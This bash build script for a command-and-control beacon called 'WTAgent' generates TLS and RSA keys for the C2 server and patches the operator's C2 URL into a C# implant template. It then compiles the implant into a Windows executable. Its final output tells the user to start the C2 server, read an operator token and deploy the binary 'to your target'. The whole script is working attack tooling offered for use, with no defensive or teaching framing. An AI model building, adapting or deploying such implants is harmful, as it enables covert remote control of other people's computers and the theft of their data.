#!/bin/bash
# ============================================================
# WTAgent build script
# Generates keys, patches WTAgent.cs, and compiles the beacon.
#
# Usage:
#   ./build.sh --url https://your-c2-server:8443
#
# Options:
#   --url   <URL>   C2 server base URL (required, no trailing slash)
#   --out   <path>  Output binary path (default: bin/WTAgent.exe)
#   --key   <path>  Existing agent_unwrap_pub.pem to use (optional)
#   --help          Show this help
# ============================================================

set -e
cd "$(dirname "$0")"

# ── Defaults ────────────────────────────────────────────────
C2_URL=""
OUT_FILE="bin/WTAgent.exe"
PUB_KEY_FILE="agent_unwrap_pub.pem"
PRIV_KEY_FILE="agent_unwrap.key"
TLS_KEY="server.key"
TLS_CERT="server.crt"
TEMPLATE="src/WTAgent.cs"
TMP_CS="/tmp/WTAgent_build_$$.cs"

# ── Argument parsing ────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        --url)  C2_URL="$2"; shift 2 ;;
        --out)  OUT_FILE="$2"; shift 2 ;;
        --key)  PUB_KEY_FILE="$2"; shift 2 ;;
        --help) grep '^#' "$0" | sed 's/^# \?//'; exit 0 ;;
        *)      echo "[!] Unknown option: $1"; exit 1 ;;
    esac
done

# ── Validate ─────────────────────────────────────────────────
if [[ -z "$C2_URL" ]]; then
    echo ""
    echo "  Usage: ./build.sh --url https://your-c2-server:8443"
    echo ""
    echo "  Example:"
    echo "    ./build.sh --url https://192.168.1.50:8443"
    echo "    ./build.sh --url https://c2.example.com:8443"
    echo ""
    exit 1
fi

# Strip trailing slash
C2_URL="${C2_URL%/}"

echo ""
echo "  ██╗    ██╗████████╗ █████╗  ██████╗ ███████╗███╗  ██╗████████╗"
echo "  ██║    ██║╚══██╔══╝██╔══██╗██╔════╝ ██╔════╝████╗ ██║╚══██╔══╝"
echo "  ██║ █╗ ██║   ██║   ███████║██║  ███╗█████╗  ██╔██╗██║   ██║   "
echo "  ██║███╗██║   ██║   ██╔══██║██║   ██║██╔══╝  ██║╚████║   ██║   "
echo "  ╚███╔███╔╝   ██║   ██║  ██║╚██████╔╝███████╗██║ ╚███║   ██║   "
echo "   ╚══╝╚══╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚══╝   ╚═╝  "
echo "  WTAgent Build Script"
echo ""
echo "  C2 URL : $C2_URL"
echo "  Output : $OUT_FILE"
echo ""

mkdir -p bin

# ── Step 1: TLS cert for C2 server ──────────────────────────
if [[ ! -f "$TLS_KEY" || ! -f "$TLS_CERT" ]]; then
    echo "[*] Generating TLS cert for C2 server..."
    openssl req -x509 -newkey rsa:2048 \
        -keyout "$TLS_KEY" -out "$TLS_CERT" \
        -days 3650 -nodes \
        -subj "/CN=WTC2" 2>/dev/null
    echo "[+] TLS cert: $TLS_CERT / $TLS_KEY"
else
    echo "[+] TLS cert already exists — skipping"
fi

# ── Step 2: RSA key pair for session key wrapping ───────────
if [[ ! -f "$PRIV_KEY_FILE" ]]; then
    echo "[*] Generating RSA-2048 key pair for agent session key wrapping..."
    openssl genrsa -out "$PRIV_KEY_FILE" 2048 2>/dev/null
    openssl rsa -in "$PRIV_KEY_FILE" -pubout -out "$PUB_KEY_FILE" 2>/dev/null
    echo "[+] RSA keys: $PRIV_KEY_FILE / $PUB_KEY_FILE"
else
    echo "[+] RSA key already exists — skipping"
    if [[ ! -f "$PUB_KEY_FILE" ]]; then
        openssl rsa -in "$PRIV_KEY_FILE" -pubout -out "$PUB_KEY_FILE" 2>/dev/null
    fi
fi

# ── Step 3: Extract base64 pubkey body (no PEM headers) ─────
PUBKEY_B64=$(grep -v "BEGIN\|END" "$PUB_KEY_FILE" | tr -d '\n')
if [[ -z "$PUBKEY_B64" ]]; then
    echo "[!] Failed to read public key from $PUB_KEY_FILE"
    exit 1
fi
echo "[+] RSA public key extracted (${#PUBKEY_B64} chars)"

# ── Step 4: Patch WTAgent.cs with URL + pubkey ──────────────
echo "[*] Patching WTAgent.cs..."
sed \
    -e "s|__C2_URL__|${C2_URL}|g" \
    -e "s|__SERVER_PUBKEY__|${PUBKEY_B64}|g" \
    "$TEMPLATE" > "$TMP_CS"
echo "[+] Patched: C2_URL=$C2_URL"

# ── Step 5: Compile ─────────────────────────────────────────
echo "[*] Looking for C# compiler..."

CSC=""

# Try mcs (Mono)
if command -v mcs &>/dev/null; then
    CSC="mcs"
    echo "[+] Compiler: mcs (Mono)"
# Try dotnet-script or dotnet (limited .NET Framework support on Linux)
elif command -v mcs-net &>/dev/null; then
    CSC="mcs-net"
else
    echo ""
    echo "  [!] No C# compiler found on this system."
    echo ""
    echo "  To compile on Linux, install Mono:"
    echo "    sudo apt-get install -y mono-mcs mono-complete"
    echo ""
    echo "  To compile on Windows, use compile.bat"
    echo "  The patched source is ready at: $TMP_CS"
    echo "  Copy it to Windows and run:"
    echo "    csc /target:exe /platform:x64 /optimize+ /unsafe"
    echo "         /r:System.Windows.Forms.dll /r:System.Drawing.dll"
    echo "         /out:bin\\WTAgent.exe WTAgent_patched.cs"
    echo ""
    cp "$TMP_CS" "src/WTAgent_patched.cs"
    echo "  Patched source saved to: src/WTAgent_patched.cs"
    rm -f "$TMP_CS"
    exit 0
fi

# Compile with mcs
if [[ "$CSC" == "mcs" ]]; then
    mcs -target:exe -platform:x64 -optimize+ -unsafe \
        -r:System.Windows.Forms.dll \
        -r:System.Drawing.dll \
        -out:"$OUT_FILE" \
        "$TMP_CS" 2>&1
fi

rm -f "$TMP_CS"

if [[ -f "$OUT_FILE" ]]; then
    SIZE=$(du -sh "$OUT_FILE" | cut -f1)
    echo ""
    echo "  ══════════════════════════════════════════"
    echo "  Build complete!"
    echo "  ══════════════════════════════════════════"
    echo "  Binary : $OUT_FILE ($SIZE)"
    echo "  C2     : $C2_URL"
    echo ""
    echo "  Next steps:"
    echo "    1. Start the C2 server:"
    echo "       node wt_c2_server.js --port 8443 --key $TLS_KEY --cert $TLS_CERT"
    echo ""
    echo "    2. Get your operator token:"
    echo "       cat wt_op_token.txt"
    echo ""
    echo "    3. Deploy $OUT_FILE to your target"
    echo ""
else
    echo ""
    echo "  [!] Compilation failed. See errors above."
    echo "  Patched source: src/WTAgent_patched.cs"
    cp "$TMP_CS" "src/WTAgent_patched.cs" 2>/dev/null || true
    exit 1
fi
